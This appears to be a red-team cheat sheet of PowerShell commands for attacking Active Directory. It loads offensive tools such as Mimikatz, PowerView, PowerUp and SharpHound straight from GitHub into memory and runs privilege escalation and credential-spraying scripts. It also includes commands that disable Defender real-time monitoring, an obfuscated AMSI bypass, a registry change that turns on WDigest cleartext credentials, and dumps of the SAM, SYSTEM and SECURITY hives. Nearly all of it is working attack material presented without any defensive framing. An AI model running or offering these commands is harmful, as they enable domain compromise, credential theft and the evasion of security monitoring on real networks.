# Password not required

Get-ADUser -Filter 'useraccountcontrol -band 32' -Properties "passwordnotrequired","useraccountcontrol","msDS-LastSuccessfulInteractiveLogonTime","lastLogonTimestamp"

$Users = get-aduser -Filter { PasswordNotRequired -eq $True } -Properties DisplayName
$Users | Format-Table SamAccountName, Name, Enabled, GivenName, DisplayName



$Users = Get-ADUser -filter { Enabled -eq $True -and PasswordNeverExpires -eq $False -and PasswordLastSet -gt 0 -and PasswordNotRequired -ne $True } -Properties $Properties -ErrorAction Stop




$browser = New-Object System.Net.WebClient;
$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
IEX($browser.DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1'));
IEX($browser.DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1'));
IEX($browser.DownloadString('https://raw.githubusercontent.com/PowershellMafia/PowerSploit/dev/Recon/PowerView.ps1'));
IEX($browser.DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'));
IEX($browser.DownloadString('https://raw.githubusercontent.com/enjoiz/Privesc/master/privesc.ps1'));Invoke-Privesc -Groups 'Users,Everyone,Authenticated Users' -Mode full -Extended

IEX($browser.DownloadString('https://raw.githubusercontent.com/xthan001/ADSA/master/Invoke-Psexec.ps1'));
IEX($browser.DownloadString('https://raw.githubusercontent.com/xthan001/ADSA/master/Invoke-WdigestDowngrade.ps1'));
IEX($browser.DownloadString('https://raw.githubusercontent.com/xthan001/ADSA/master/MakeMeEnterpriseAdmin.ps1'));
IEX($browser.DownloadString('https://raw.githubusercontent.com/xthan001/ADSA/master/Seatbelt.ps1'));
IEX($browser.DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1'));Import-ActiveDirectory
IEX($browser.DownloadString('https://raw.githubusercontent.com/Raikia/CredNinja/master/Invoke-CredNinja.ps1'));
IEX($browser.DownloadString(''));
IEX($browser.DownloadString(''));

powershell -version 2 -command {$browser.DownloadString('https://raw.githubusercontent.com/PowershellMafia/PowerSploit/dev/Recon/PowerView.ps1'));}
powershell -ep bypass 

get-netcomputer -fulldata | select cn,operatingsystem,logoncount,lastlogin | format-table -wrap -autosize | out-file computers.txt

Find-DomainShare

SharpHound.exe -c All --Stealth --NoSaveCache
InvokeBloodHound -CollectionMethod All,ObjectProps,DCOnly --NoSaveCache
SharpHound.exe -c SessionLoop 


# disabling defenses
Set-MpPreference -DisableRealtimeMonitoring $true

# amsi
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE](
"{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL
)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -
f'Util','A','Amsi','.Management.','utomation.','s','System' )
)."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),(
"{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(
${n`ULl},${t`RuE} )


# Enable wdigest
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1

# get the SAM,SECURITY,SYSTEM reg keys from the windows 7 system
reg save HKLM\SAM C:\sam
reg save HKLM\SYSTEM C:\system
re save HKLM\SECURITY C:\security
